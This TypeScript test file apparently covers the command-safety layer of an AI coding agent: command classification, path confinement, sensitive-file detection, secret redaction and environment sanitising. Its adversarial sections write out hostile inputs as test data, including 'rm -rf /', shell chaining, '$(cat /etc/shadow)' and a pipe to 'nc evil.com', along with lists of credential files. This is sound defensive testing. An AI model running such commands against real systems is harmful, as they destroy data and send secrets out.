import { describe, expect, test } from './harness';
import {
  classifyCommand,
  filterCommandOutput,
  hasPathTraversal,
  isPathConfined,
  isSensitiveFile,
  parseCommandString,
  sanitizeEnvironment,
  truncateOutput,
} from '../src/shared/ai/agentExec';

// ---------------------------------------------------------------------------
// classifyCommand — three-tier policy
// ---------------------------------------------------------------------------

describe('AgentExec — classifyCommand: allowed (auto-approved read-only)', () => {
  test('cat is auto-approved', () => {
    const p = classifyCommand('cat', ['src/main.zx']);
    expect(p.verdict).toBe('allowed');
  });

  test('ls is auto-approved', () => {
    expect(classifyCommand('ls', ['-la']).verdict).toBe('allowed');
  });

  test('pwd is auto-approved', () => {
    expect(classifyCommand('pwd', []).verdict).toBe('allowed');
  });

  test('echo is auto-approved', () => {
    expect(classifyCommand('echo', ['hello']).verdict).toBe('allowed');
  });

  test('head/tail/wc/sort/find/grep/diff are read-only', () => {
    for (const cmd of ['head', 'tail', 'wc', 'sort', 'find', 'grep', 'diff']) {
      expect(classifyCommand(cmd, ['some', 'args']).verdict).toBe('allowed');
    }
  });

  test('which is auto-approved', () => {
    expect(classifyCommand('which', ['node']).verdict).toBe('allowed');
  });

  test('git status is auto-approved', () => {
    expect(classifyCommand('git', ['status']).verdict).toBe('allowed');
  });

  test('git log/diff/show/branch/remote/blame are read-only', () => {
    for (const sub of ['log', 'diff', 'show', 'branch', 'remote', 'blame']) {
      expect(classifyCommand('git', [sub]).verdict).toBe('allowed');
    }
  });

  test('git rev-parse is auto-approved', () => {
    expect(classifyCommand('git', ['rev-parse', 'HEAD']).verdict).toBe('allowed');
  });

  test('git ls-files is auto-approved', () => {
    expect(classifyCommand('git', ['ls-files']).verdict).toBe('allowed');
  });

  test('zornux check is auto-approved', () => {
    expect(classifyCommand('zornux', ['check', '.']).verdict).toBe('allowed');
  });

  test('zornux info is auto-approved', () => {
    expect(classifyCommand('zornux', ['info']).verdict).toBe('allowed');
  });

  test('zornux version is auto-approved', () => {
    expect(classifyCommand('zornux', ['version']).verdict).toBe('allowed');
  });
});

describe('AgentExec — classifyCommand: needs_approval', () => {
  test('git commit needs approval', () => {
    const p = classifyCommand('git', ['commit', '-m', 'fix']);
    expect(p.verdict).toBe('needs_approval');
  });

  test('git add needs approval', () => {
    expect(classifyCommand('git', ['add', '.']).verdict).toBe('needs_approval');
  });

  test('npm install needs approval', () => {
    expect(classifyCommand('npm', ['install']).verdict).toBe('needs_approval');
  });

  test('node with script needs approval', () => {
    expect(classifyCommand('node', ['build.js']).verdict).toBe('needs_approval');
  });

  test('zornux test needs approval (not read-only)', () => {
    expect(classifyCommand('zornux', ['test', '.']).verdict).toBe('needs_approval');
  });

  test('zornux build needs approval', () => {
    expect(classifyCommand('zornux', ['build']).verdict).toBe('needs_approval');
  });

  test('unknown command needs approval', () => {
    const p = classifyCommand('myCustomTool', ['--flag']);
    expect(p.verdict).toBe('needs_approval');
    expect(p.reason).toContain('Unknown command');
  });

  test('tsc needs approval', () => {
    expect(classifyCommand('tsc', ['--noEmit']).verdict).toBe('needs_approval');
  });

  test('eslint needs approval', () => {
    expect(classifyCommand('eslint', ['src/']).verdict).toBe('needs_approval');
  });

  test('prettier needs approval', () => {
    expect(classifyCommand('prettier', ['--write', '.']).verdict).toBe('needs_approval');
  });
});

describe('AgentExec — classifyCommand: blocked executables', () => {
  test('rm is blocked', () => {
    const p = classifyCommand('rm', ['-rf', '/']);
    expect(p.verdict).toBe('blocked');
    expect(p.reason).toContain('rm');
  });

  test('sudo is blocked', () => {
    expect(classifyCommand('sudo', ['ls']).verdict).toBe('blocked');
  });

  test('curl is blocked', () => {
    expect(classifyCommand('curl', ['https://example.com']).verdict).toBe('blocked');
  });

  test('wget is blocked', () => {
    expect(classifyCommand('wget', ['https://example.com']).verdict).toBe('blocked');
  });

  test('docker is blocked', () => {
    expect(classifyCommand('docker', ['run', 'alpine']).verdict).toBe('blocked');
  });

  test('kubectl is blocked', () => {
    expect(classifyCommand('kubectl', ['apply', '-f', 'deploy.yml']).verdict).toBe('blocked');
  });

  test('chmod is blocked', () => {
    expect(classifyCommand('chmod', ['777', 'file']).verdict).toBe('blocked');
  });

  test('chown is blocked', () => {
    expect(classifyCommand('chown', ['root', 'file']).verdict).toBe('blocked');
  });

  test('ssh is blocked', () => {
    expect(classifyCommand('ssh', ['user@host']).verdict).toBe('blocked');
  });

  test('systemctl is blocked', () => {
    expect(classifyCommand('systemctl', ['restart', 'nginx']).verdict).toBe('blocked');
  });

  test('env is blocked', () => {
    expect(classifyCommand('env', []).verdict).toBe('blocked');
  });

  test('shutdown is blocked', () => {
    expect(classifyCommand('shutdown', ['-h', 'now']).verdict).toBe('blocked');
  });

  test('mount is blocked', () => {
    expect(classifyCommand('mount', ['/dev/sda1', '/mnt']).verdict).toBe('blocked');
  });
});

describe('AgentExec — classifyCommand: dangerous argument patterns', () => {
  test('--force blocks allowed command', () => {
    const p = classifyCommand('git', ['push', '--force']);
    expect(p.verdict).toBe('blocked');
    expect(p.reason).toContain('dangerous pattern');
  });

  test('--hard blocks', () => {
    expect(classifyCommand('git', ['reset', '--hard', 'HEAD~1']).verdict).toBe('blocked');
  });

  test('--no-verify blocks', () => {
    expect(classifyCommand('git', ['commit', '--no-verify', '-m', 'yolo']).verdict).toBe('blocked');
  });

  test('git push is blocked (even without --force)', () => {
    expect(classifyCommand('git', ['push']).verdict).toBe('blocked');
  });

  test('git push -f is blocked', () => {
    expect(classifyCommand('git', ['push', '-f', 'origin', 'main']).verdict).toBe('blocked');
  });

  test('git clean is blocked', () => {
    expect(classifyCommand('git', ['clean', '-fd']).verdict).toBe('blocked');
  });

  test('git checkout . is blocked', () => {
    expect(classifyCommand('git', ['checkout', '.']).verdict).toBe('blocked');
  });

  test('drop table is blocked', () => {
    expect(classifyCommand('node', ['-e', 'drop table users']).verdict).toBe('blocked');
  });

  test('truncate is blocked', () => {
    expect(classifyCommand('node', ['-e', 'TRUNCATE sessions']).verdict).toBe('blocked');
  });

  test('kill -9 is blocked', () => {
    expect(classifyCommand('node', ['-e', 'kill -9 1234']).verdict).toBe('blocked');
  });

  test('killall is blocked', () => {
    expect(classifyCommand('node', ['-e', 'killall node']).verdict).toBe('blocked');
  });

  test('pipe to sh is blocked', () => {
    expect(classifyCommand('node', ['-e', 'something | sh']).verdict).toBe('blocked');
  });

  test('pipe to bash is blocked', () => {
    expect(classifyCommand('node', ['-e', 'something | bash']).verdict).toBe('blocked');
  });

  test('npm publish is blocked', () => {
    expect(classifyCommand('npm', ['publish']).verdict).toBe('blocked');
  });

  test('cargo publish is blocked', () => {
    expect(classifyCommand('cargo', ['publish']).verdict).toBe('blocked');
  });

  test('write to /dev/sd is blocked', () => {
    expect(classifyCommand('node', ['-e', '> /dev/sda']).verdict).toBe('blocked');
  });
});

describe('AgentExec — classifyCommand: path handling', () => {
  test('extracts executable from full path', () => {
    const p = classifyCommand('/usr/bin/cat', ['file.txt']);
    expect(p.verdict).toBe('allowed');
  });

  test('strips .exe extension on Windows-style paths', () => {
    const p = classifyCommand('C:\\Windows\\System32\\cmd.exe', []);
    expect(p.verdict).toBe('blocked');
  });

  test('case-insensitive executable matching', () => {
    expect(classifyCommand('RM', ['-rf', '/']).verdict).toBe('blocked');
    expect(classifyCommand('SUDO', ['ls']).verdict).toBe('blocked');
  });
});

// ---------------------------------------------------------------------------
// isPathConfined — workspace boundary
// ---------------------------------------------------------------------------

describe('AgentExec — isPathConfined', () => {
  test('path inside root is confined', () => {
    expect(isPathConfined('/home/user/project/src/main.zx', ['/home/user/project'])).toBe(true);
  });

  test('path at root is confined', () => {
    expect(isPathConfined('/home/user/project', ['/home/user/project'])).toBe(true);
  });

  test('path outside root is not confined', () => {
    expect(isPathConfined('/etc/passwd', ['/home/user/project'])).toBe(false);
  });

  test('partial prefix match does not count', () => {
    expect(isPathConfined('/home/user/project-other/file.zx', ['/home/user/project'])).toBe(false);
  });

  test('multiple roots: confined if in any', () => {
    const roots = ['/workspace/a', '/workspace/b'];
    expect(isPathConfined('/workspace/b/src/x.zx', roots)).toBe(true);
  });

  test('empty roots array permits all', () => {
    expect(isPathConfined('/anywhere/file.txt', [])).toBe(true);
  });

  test('backslash paths are normalized', () => {
    expect(isPathConfined('C:\\Users\\dev\\project\\src\\file.zx', ['C:\\Users\\dev\\project'])).toBe(true);
  });

  test('trailing slashes are stripped for comparison', () => {
    expect(isPathConfined('/project/src/file.zx', ['/project/'])).toBe(true);
  });
});

// ---------------------------------------------------------------------------
// hasPathTraversal
// ---------------------------------------------------------------------------

describe('AgentExec — hasPathTraversal', () => {
  test('rejects .. in path', () => {
    expect(hasPathTraversal('../../../etc/passwd')).toBe(true);
  });

  test('rejects .. in middle', () => {
    expect(hasPathTraversal('src/../../../etc/shadow')).toBe(true);
  });

  test('rejects ~ segment', () => {
    expect(hasPathTraversal('~/secret')).toBe(true);
  });

  test('accepts clean relative path', () => {
    expect(hasPathTraversal('src/main.zx')).toBe(false);
  });

  test('accepts absolute path', () => {
    expect(hasPathTraversal('/home/user/project/src/main.zx')).toBe(false);
  });

  test('does not flag .. substring in filenames', () => {
    expect(hasPathTraversal('src/file..name.zx')).toBe(false);
  });

  test('rejects backslash traversal', () => {
    expect(hasPathTraversal('src\\..\\..\\etc\\passwd')).toBe(true);
  });
});

// ---------------------------------------------------------------------------
// isSensitiveFile
// ---------------------------------------------------------------------------

describe('AgentExec — isSensitiveFile', () => {
  test('blocks .env', () => {
    expect(isSensitiveFile('.env')).toBe(true);
  });

  test('blocks .env.production', () => {
    expect(isSensitiveFile('.env.production')).toBe(true);
  });

  test('blocks .pem files', () => {
    expect(isSensitiveFile('server.pem')).toBe(true);
  });

  test('blocks .key files', () => {
    expect(isSensitiveFile('private.key')).toBe(true);
  });

  test('blocks id_rsa', () => {
    expect(isSensitiveFile('/home/user/.ssh/id_rsa')).toBe(true);
  });

  test('blocks id_ed25519', () => {
    expect(isSensitiveFile('id_ed25519')).toBe(true);
  });

  test('blocks .ssh/ directory paths', () => {
    expect(isSensitiveFile('/home/user/.ssh/config')).toBe(true);
  });

  test('blocks credentials.json', () => {
    expect(isSensitiveFile('credentials.json')).toBe(true);
  });

  test('blocks service_account.json', () => {
    expect(isSensitiveFile('service_account.json')).toBe(true);
  });

  test('blocks service-account-key.json', () => {
    expect(isSensitiveFile('service-account-key.json')).toBe(true);
  });

  test('blocks .npmrc', () => {
    expect(isSensitiveFile('.npmrc')).toBe(true);
  });

  test('blocks .pypirc', () => {
    expect(isSensitiveFile('.pypirc')).toBe(true);
  });

  test('blocks .netrc', () => {
    expect(isSensitiveFile('.netrc')).toBe(true);
  });

  test('blocks .git/config', () => {
    expect(isSensitiveFile('.git/config')).toBe(true);
  });

  test('blocks .p12 and .pfx files', () => {
    expect(isSensitiveFile('cert.p12')).toBe(true);
    expect(isSensitiveFile('cert.pfx')).toBe(true);
  });

  test('blocks .jks and .keystore files', () => {
    expect(isSensitiveFile('app.jks')).toBe(true);
    expect(isSensitiveFile('release.keystore')).toBe(true);
  });

  test('allows normal source files', () => {
    expect(isSensitiveFile('src/main.zx')).toBe(false);
  });

  test('allows package.json', () => {
    expect(isSensitiveFile('package.json')).toBe(false);
  });

  test('allows tsconfig.json', () => {
    expect(isSensitiveFile('tsconfig.json')).toBe(false);
  });

  test('normalizes backslash paths', () => {
    expect(isSensitiveFile('C:\\Users\\dev\\.ssh\\id_rsa')).toBe(true);
  });
});

// ---------------------------------------------------------------------------
// filterCommandOutput — secret redaction
// ---------------------------------------------------------------------------

describe('AgentExec — filterCommandOutput: long tokens', () => {
  test('redacts quoted long tokens (32+ chars)', () => {
    const out = 'key = "abcdefghijklmnopqrstuvwxyz1234567890"';
    const filtered = filterCommandOutput(out);
    expect(filtered).toContain('[REDACTED]');
    expect(filtered.includes('abcdefghijklmnopqrstuvwxyz1234567890')).toBe(false);
  });

  test('does not redact short quoted strings', () => {
    const out = 'name = "hello"';
    const filtered = filterCommandOutput(out);
    expect(filtered).toBe(out);
  });
});

describe('AgentExec — filterCommandOutput: env secrets', () => {
  test('redacts api_key assignments', () => {
    const out = 'api_key = sk-testkey-very-long';
    const filtered = filterCommandOutput(out);
    expect(filtered).toContain('[REDACTED]');
    expect(filtered.includes('sk-testkey')).toBe(false);
  });

  test('redacts password assignments', () => {
    const out = 'password: supersecretpassword123';
    const filtered = filterCommandOutput(out);
    expect(filtered).toContain('[REDACTED]');
  });

  test('redacts database_url', () => {
    const out = 'database_url=postgres://user:pass@host:5432/db';
    const filtered = filterCommandOutput(out);
    expect(filtered).toContain('[REDACTED]');
  });

  test('redacts jwt_secret', () => {
    const out = 'jwt_secret = "my-long-jwt-secret"';
    const filtered = filterCommandOutput(out);
    expect(filtered).toContain('[REDACTED]');
  });
});

describe('AgentExec — filterCommandOutput: certificates', () => {
  test('redacts PEM certificates', () => {
    const out = 'Loaded cert:\n-----BEGIN RSA PRIVATE KEY-----\nMIIBogIBAAJ...\n-----END RSA PRIVATE KEY-----\nDone.';
    const filtered = filterCommandOutput(out);
    expect(filtered).toContain('[REDACTED CERTIFICATE]');
    expect(filtered.includes('MIIBogIBAAJ')).toBe(false);
  });

  test('redacts multiple PEM blocks', () => {
    const out = '-----BEGIN CERTIFICATE-----\nAAA\n-----END CERTIFICATE-----\n-----BEGIN PRIVATE KEY-----\nBBB\n-----END PRIVATE KEY-----';
    const filtered = filterCommandOutput(out);
    const count = (filtered.match(/\[REDACTED CERTIFICATE\]/g) || []).length;
    expect(count).toBe(2);
  });
});

describe('AgentExec — filterCommandOutput: Bearer tokens', () => {
  test('redacts Bearer tokens', () => {
    const out = 'Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjM0NTY3ODkw';
    const filtered = filterCommandOutput(out);
    expect(filtered).toContain('Bearer [REDACTED]');
    expect(filtered.includes('eyJhbGciOiJIUzI1NiJ9')).toBe(false);
  });
});

describe('AgentExec — filterCommandOutput: provider-specific tokens', () => {
  test('redacts GitHub PATs', () => {
    const out = 'token: ghp_aBcDeFgHiJkLmNoPqRsTuVwXyZ12345';
    const filtered = filterCommandOutput(out);
    expect(filtered).toContain('[REDACTED]');
    expect(filtered.includes('ghp_aBcDeFg')).toBe(false);
  });

  test('redacts various GitHub token prefixes', () => {
    for (const prefix of ['gho_', 'ghu_', 'ghs_', 'ghr_', 'github_pat_']) {
      const token = `${prefix}${'a'.repeat(30)}`;
      const filtered = filterCommandOutput(`val=${token}`);
      expect(filtered).toContain('[REDACTED]');
    }
  });

  test('redacts Stripe keys', () => {
    const out = `sk_live_${'a'.repeat(30)}`;
    const filtered = filterCommandOutput(out);
    expect(filtered).toContain('[REDACTED]');
  });

  test('redacts sk- prefixed keys', () => {
    const out = `key: sk-${'x'.repeat(30)}`;
    const filtered = filterCommandOutput(out);
    expect(filtered).toContain('[REDACTED]');
  });
});

describe('AgentExec — filterCommandOutput: passthrough', () => {
  test('normal build output passes through unchanged', () => {
    const out = 'Build successful. 0 errors, 2 warnings.\nCompiled 42 files in 1.3s.';
    expect(filterCommandOutput(out)).toBe(out);
  });

  test('empty string passes through', () => {
    expect(filterCommandOutput('')).toBe('');
  });
});

// ---------------------------------------------------------------------------
// sanitizeEnvironment
// ---------------------------------------------------------------------------

describe('AgentExec — sanitizeEnvironment', () => {
  test('removes API_KEY', () => {
    const env = { PATH: '/usr/bin', API_KEY: 'secret', HOME: '/home/user' };
    const clean = sanitizeEnvironment(env);
    expect(clean['PATH']).toBe('/usr/bin');
    expect(clean['HOME']).toBe('/home/user');
    expect(clean['API_KEY']).toBe(undefined);
  });

  test('removes PASSWORD', () => {
    const env = { DB_PASSWORD: 'pass123', NODE_ENV: 'test' };
    const clean = sanitizeEnvironment(env);
    expect(clean['DB_PASSWORD']).toBe(undefined);
    expect(clean['NODE_ENV']).toBe('test');
  });

  test('removes SECRET-containing keys', () => {
    const env = { MY_APP_SECRET: 'x', CLIENT_SECRET: 'y', LANG: 'en' };
    const clean = sanitizeEnvironment(env);
    expect(clean['MY_APP_SECRET']).toBe(undefined);
    expect(clean['CLIENT_SECRET']).toBe(undefined);
    expect(clean['LANG']).toBe('en');
  });

  test('removes TOKEN-containing keys', () => {
    const env = { AUTH_TOKEN: 'tok', GITHUB_TOKEN: 'ghp', SHELL: '/bin/bash' };
    const clean = sanitizeEnvironment(env);
    expect(clean['AUTH_TOKEN']).toBe(undefined);
    expect(clean['GITHUB_TOKEN']).toBe(undefined);
    expect(clean['SHELL']).toBe('/bin/bash');
  });

  test('removes CREDENTIAL-containing keys', () => {
    const env = { AZURE_CREDENTIAL: 'cred', TERM: 'xterm' };
    const clean = sanitizeEnvironment(env);
    expect(clean['AZURE_CREDENTIAL']).toBe(undefined);
    expect(clean['TERM']).toBe('xterm');
  });

  test('removes PRIVATE_KEY-containing keys', () => {
    const env = { SIGNING_PRIVATE_KEY: 'pk', USER: 'dev' };
    const clean = sanitizeEnvironment(env);
    expect(clean['SIGNING_PRIVATE_KEY']).toBe(undefined);
    expect(clean['USER']).toBe('dev');
  });

  test('case-insensitive matching (uppercase keys checked)', () => {
    const env = { api_key: 'val', Api_Secret: 'val2', EDITOR: 'vim' };
    const clean = sanitizeEnvironment(env);
    expect(clean['api_key']).toBe(undefined);
    expect(clean['Api_Secret']).toBe(undefined);
    expect(clean['EDITOR']).toBe('vim');
  });

  test('keeps safe environment variables', () => {
    const safe = { PATH: '/usr/bin', HOME: '/home/u', LANG: 'en_US', NODE_ENV: 'dev', SHELL: '/bin/bash' };
    const clean = sanitizeEnvironment(safe);
    expect(Object.keys(clean).length).toBe(5);
  });

  test('handles empty environment', () => {
    const clean = sanitizeEnvironment({});
    expect(Object.keys(clean).length).toBe(0);
  });
});

// ---------------------------------------------------------------------------
// truncateOutput
// ---------------------------------------------------------------------------

describe('AgentExec — truncateOutput', () => {
  test('short output passes through', () => {
    const result = truncateOutput('hello', 100);
    expect(result.text).toBe('hello');
    expect(result.truncated).toBe(false);
  });

  test('output at exact limit passes through', () => {
    const text = 'a'.repeat(50);
    const result = truncateOutput(text, 50);
    expect(result.text).toBe(text);
    expect(result.truncated).toBe(false);
  });

  test('long output is truncated with head + tail', () => {
    const text = 'a'.repeat(100);
    const result = truncateOutput(text, 50);
    expect(result.truncated).toBe(true);
    expect(result.text).toContain('omitted');
    expect(result.text.length < 100).toBe(true);
  });

  test('truncated output preserves head (60%) and tail (30%)', () => {
    const text = 'H'.repeat(300) + 'M'.repeat(200) + 'T'.repeat(500);
    const result = truncateOutput(text, 100);
    expect(result.truncated).toBe(true);
    const headPart = result.text.split('\n\n')[0];
    const parts = result.text.split('\n\n');
    const tailPart = parts[parts.length - 1];
    expect(headPart[0]).toBe('H');
    expect(tailPart[tailPart.length - 1]).toBe('T');
  });

  test('skipped count is accurate', () => {
    const text = 'x'.repeat(1000);
    const result = truncateOutput(text, 100);
    const match = result.text.match(/\((\d+) characters omitted\)/);
    expect(match).toBeTruthy();
    const skipped = parseInt(match![1], 10);
    expect(skipped).toBeGreaterThan(0);
    expect(skipped).toBe(1000 - 60 - 30); // 60% head + 30% tail of 100
  });

  test('empty string passes through', () => {
    const result = truncateOutput('', 100);
    expect(result.text).toBe('');
    expect(result.truncated).toBe(false);
  });
});

// ---------------------------------------------------------------------------
// parseCommandString — quote-aware splitting
// ---------------------------------------------------------------------------

describe('AgentExec — parseCommandString', () => {
  test('splits simple command', () => {
    const r = parseCommandString('ls -la');
    expect(r.command).toBe('ls');
    expect(r.args).toEqual(['-la']);
  });

  test('handles double-quoted args', () => {
    const r = parseCommandString('echo "hello world"');
    expect(r.command).toBe('echo');
    expect(r.args).toEqual(['hello world']);
  });

  test('handles single-quoted args', () => {
    const r = parseCommandString("echo 'hello world'");
    expect(r.command).toBe('echo');
    expect(r.args).toEqual(['hello world']);
  });

  test('handles mixed quotes', () => {
    const r = parseCommandString('git commit -m "it\'s fixed"');
    expect(r.command).toBe('git');
    expect(r.args[0]).toBe('commit');
    expect(r.args[1]).toBe('-m');
    expect(r.args[2]).toBe("it's fixed");
  });

  test('handles multiple spaces between args', () => {
    const r = parseCommandString('ls    -la     /tmp');
    expect(r.command).toBe('ls');
    expect(r.args).toEqual(['-la', '/tmp']);
  });

  test('handles tab separators', () => {
    const r = parseCommandString('git\tstatus');
    expect(r.command).toBe('git');
    expect(r.args).toEqual(['status']);
  });

  test('handles empty string', () => {
    const r = parseCommandString('');
    expect(r.command).toBe('');
    expect(r.args).toHaveLength(0);
  });

  test('handles whitespace-only string', () => {
    const r = parseCommandString('   ');
    expect(r.command).toBe('');
    expect(r.args).toHaveLength(0);
  });

  test('handles command with no args', () => {
    const r = parseCommandString('pwd');
    expect(r.command).toBe('pwd');
    expect(r.args).toHaveLength(0);
  });

  test('preserves complex quoted paths', () => {
    const r = parseCommandString('cat "/path/to/my file.txt" another');
    expect(r.command).toBe('cat');
    expect(r.args[0]).toBe('/path/to/my file.txt');
    expect(r.args[1]).toBe('another');
  });

  test('strips leading/trailing whitespace', () => {
    const r = parseCommandString('  git status  ');
    expect(r.command).toBe('git');
    expect(r.args).toEqual(['status']);
  });
});

// ---------------------------------------------------------------------------
// Integration: classifyCommand + parseCommandString round-trip
// ---------------------------------------------------------------------------

describe('AgentExec — classify+parse round-trip', () => {
  test('parsed safe command classifies as allowed', () => {
    const { command, args } = parseCommandString('cat src/main.zx');
    expect(classifyCommand(command, args).verdict).toBe('allowed');
  });

  test('parsed blocked command classifies as blocked', () => {
    const { command, args } = parseCommandString('rm -rf /');
    expect(classifyCommand(command, args).verdict).toBe('blocked');
  });

  test('parsed dangerous pattern classifies as blocked', () => {
    const { command, args } = parseCommandString('git push --force origin main');
    expect(classifyCommand(command, args).verdict).toBe('blocked');
  });

  test('parsed write command needs approval', () => {
    const { command, args } = parseCommandString('npm install lodash');
    expect(classifyCommand(command, args).verdict).toBe('needs_approval');
  });
});

// ---------------------------------------------------------------------------
// ADVERSARIAL: shell interpreter bypass
// ---------------------------------------------------------------------------

describe('AgentExec — adversarial: shell interpreter bypass', () => {
  test('sh is blocked', () => {
    expect(classifyCommand('sh', ['-c', 'cat /etc/passwd']).verdict).toBe('blocked');
  });

  test('bash is blocked', () => {
    expect(classifyCommand('bash', ['-c', 'curl evil.com']).verdict).toBe('blocked');
  });

  test('zsh is blocked', () => {
    expect(classifyCommand('zsh', ['-c', 'anything']).verdict).toBe('blocked');
  });

  test('dash is blocked', () => {
    expect(classifyCommand('dash', ['-c', 'anything']).verdict).toBe('blocked');
  });

  test('fish is blocked', () => {
    expect(classifyCommand('fish', ['-c', 'anything']).verdict).toBe('blocked');
  });

  test('powershell is blocked', () => {
    expect(classifyCommand('powershell', ['-Command', 'Get-Process']).verdict).toBe('blocked');
  });

  test('pwsh is blocked', () => {
    expect(classifyCommand('pwsh', ['-c', 'anything']).verdict).toBe('blocked');
  });

  test('cmd is blocked', () => {
    expect(classifyCommand('cmd', ['/c', 'del *']).verdict).toBe('blocked');
  });

  test('/usr/bin/bash is blocked (path extraction)', () => {
    expect(classifyCommand('/usr/bin/bash', ['-c', 'echo pwned']).verdict).toBe('blocked');
  });

  test('bash.exe is blocked (Windows extension)', () => {
    expect(classifyCommand('bash.exe', ['-c', 'echo pwned']).verdict).toBe('blocked');
  });

  test('sh.bat is blocked (bat extension)', () => {
    expect(classifyCommand('sh.bat', []).verdict).toBe('blocked');
  });
});

// ---------------------------------------------------------------------------
// ADVERSARIAL: shell metacharacter injection
// ---------------------------------------------------------------------------

describe('AgentExec — adversarial: shell metacharacter injection', () => {
  test('semicolon chaining is blocked', () => {
    expect(classifyCommand('ls', ['; rm -rf /']).verdict).toBe('blocked');
  });

  test('&& chaining is blocked', () => {
    expect(classifyCommand('echo', ['hello && curl evil.com']).verdict).toBe('blocked');
  });

  test('|| chaining is blocked', () => {
    expect(classifyCommand('echo', ['hello || rm -rf /']).verdict).toBe('blocked');
  });

  test('backtick substitution is blocked', () => {
    expect(classifyCommand('echo', ['`cat /etc/passwd`']).verdict).toBe('blocked');
  });

  test('$() command substitution is blocked', () => {
    expect(classifyCommand('echo', ['$(cat /etc/shadow)']).verdict).toBe('blocked');
  });

  test('pipe to arbitrary command is blocked', () => {
    expect(classifyCommand('cat', ['file.txt', '|', 'nc', 'evil.com', '1234']).verdict).toBe('blocked');
  });

  test('dollar sign in args is blocked', () => {
    expect(classifyCommand('echo', ['$HOME']).verdict).toBe('blocked');
  });

  test('combined metacharacters are blocked', () => {
    expect(classifyCommand('ls', ['-la;', 'curl', 'evil.com']).verdict).toBe('blocked');
  });

  test('round-trip: ls ; rm -rf / is blocked', () => {
    const { command, args } = parseCommandString('ls ; rm -rf /');
    expect(classifyCommand(command, args).verdict).toBe('blocked');
  });

  test('round-trip: echo $(whoami) is blocked', () => {
    const { command, args } = parseCommandString('echo $(whoami)');
    expect(classifyCommand(command, args).verdict).toBe('blocked');
  });
});

// ---------------------------------------------------------------------------
// ADVERSARIAL: executable extension bypass
// ---------------------------------------------------------------------------

describe('AgentExec — adversarial: executable extension bypass', () => {
  test('rm.bat is blocked', () => {
    expect(classifyCommand('rm.bat', []).verdict).toBe('blocked');
  });

  test('rm.cmd is blocked', () => {
    expect(classifyCommand('rm.cmd', []).verdict).toBe('blocked');
  });

  test('curl.sh is blocked', () => {
    expect(classifyCommand('curl.sh', []).verdict).toBe('blocked');
  });

  test('sudo.ps1 is blocked', () => {
    expect(classifyCommand('sudo.ps1', []).verdict).toBe('blocked');
  });

  test('rm.com is blocked', () => {
    expect(classifyCommand('rm.com', []).verdict).toBe('blocked');
  });

  test('ssh.exe is blocked', () => {
    expect(classifyCommand('ssh.exe', []).verdict).toBe('blocked');
  });
});

// ---------------------------------------------------------------------------
// ADVERSARIAL: expanded sensitive file detection
// ---------------------------------------------------------------------------

describe('AgentExec — adversarial: expanded sensitive files', () => {
  test('blocks .htpasswd', () => {
    expect(isSensitiveFile('.htpasswd')).toBe(true);
  });

  test('blocks .docker/config.json', () => {
    expect(isSensitiveFile('.docker/config.json')).toBe(true);
  });

  test('blocks kubeconfig', () => {
    expect(isSensitiveFile('kubeconfig')).toBe(true);
  });

  test('blocks .kube/config', () => {
    expect(isSensitiveFile('.kube/config')).toBe(true);
  });

  test('blocks .aws/credentials', () => {
    expect(isSensitiveFile('.aws/credentials')).toBe(true);
  });

  test('blocks bare credentials file', () => {
    expect(isSensitiveFile('credentials')).toBe(true);
  });

  test('blocks .pgpass', () => {
    expect(isSensitiveFile('.pgpass')).toBe(true);
  });

  test('blocks .bash_history', () => {
    expect(isSensitiveFile('.bash_history')).toBe(true);
  });

  test('blocks .zsh_history', () => {
    expect(isSensitiveFile('.zsh_history')).toBe(true);
  });

  test('blocks terraform.tfstate', () => {
    expect(isSensitiveFile('terraform.tfstate')).toBe(true);
  });

  test('blocks .gnupg/ paths', () => {
    expect(isSensitiveFile('.gnupg/private-keys.d/key')).toBe(true);
  });

  test('blocks token.json', () => {
    expect(isSensitiveFile('token.json')).toBe(true);
  });
});

// ---------------------------------------------------------------------------
// ADVERSARIAL: environment sanitization (API_KEY substring)
// ---------------------------------------------------------------------------

describe('AgentExec — adversarial: env sanitization with API_KEY', () => {
  test('removes MY_API_KEY (substring match)', () => {
    const env = { MY_API_KEY: 'secret', PATH: '/usr/bin' };
    const clean = sanitizeEnvironment(env);
    expect(clean['MY_API_KEY']).toBe(undefined);
    expect(clean['PATH']).toBe('/usr/bin');
  });

  test('removes CUSTOM_APIKEY (substring match)', () => {
    const env = { CUSTOM_APIKEY: 'secret', HOME: '/home/u' };
    const clean = sanitizeEnvironment(env);
    expect(clean['CUSTOM_APIKEY']).toBe(undefined);
    expect(clean['HOME']).toBe('/home/u');
  });

  test('removes STRIPE_API_KEY', () => {
    const env = { STRIPE_API_KEY: 'sk_test_xxx', TERM: 'xterm' };
    const clean = sanitizeEnvironment(env);
    expect(clean['STRIPE_API_KEY']).toBe(undefined);
    expect(clean['TERM']).toBe('xterm');
  });
});

// ---------------------------------------------------------------------------
// ADVERSARIAL: truncateOutput edge cases
// ---------------------------------------------------------------------------

describe('AgentExec — adversarial: truncateOutput edge cases', () => {
  test('maxBytes = 0 returns empty and marks truncated', () => {
    const result = truncateOutput('hello', 0);
    expect(result.text).toBe('');
    expect(result.truncated).toBe(true);
  });

  test('maxBytes = 0 with empty input returns empty, not truncated', () => {
    const result = truncateOutput('', 0);
    expect(result.text).toBe('');
    expect(result.truncated).toBe(false);
  });

  test('maxBytes = 1 truncates longer input', () => {
    const result = truncateOutput('abc', 1);
    expect(result.truncated).toBe(true);
  });

  test('negative maxBytes returns empty', () => {
    const result = truncateOutput('hello world', -10);
    expect(result.text).toBe('');
    expect(result.truncated).toBe(true);
  });
});

// ---------------------------------------------------------------------------
// ADVERSARIAL: filterCommandOutput — AWS keys and more
// ---------------------------------------------------------------------------

describe('AgentExec — adversarial: AWS key redaction', () => {
  test('redacts AWS access key IDs', () => {
    const out = 'access_key_id: AKIAIOSFODNN7EXAMPLE';
    const filtered = filterCommandOutput(out);
    expect(filtered.includes('AKIAIOSFODNN7EXAMPLE')).toBe(false);
  });

  test('redacts AWS key in env output', () => {
    const out = 'AWS_ACCESS_KEY_ID=AKIAI44QH8DHBEXAMPLE';
    const filtered = filterCommandOutput(out);
    expect(filtered.includes('AKIAI44QH8DHBEXAMPLE')).toBe(false);
  });
});

// ---------------------------------------------------------------------------
// ADVERSARIAL: case insensitive git checkout .
// ---------------------------------------------------------------------------

describe('AgentExec — adversarial: case-insensitive dangerous patterns', () => {
  test('GIT CHECKOUT . is blocked (uppercase)', () => {
    expect(classifyCommand('GIT', ['CHECKOUT', '.']).verdict).toBe('blocked');
  });

  test('Git Checkout . is blocked (mixed case)', () => {
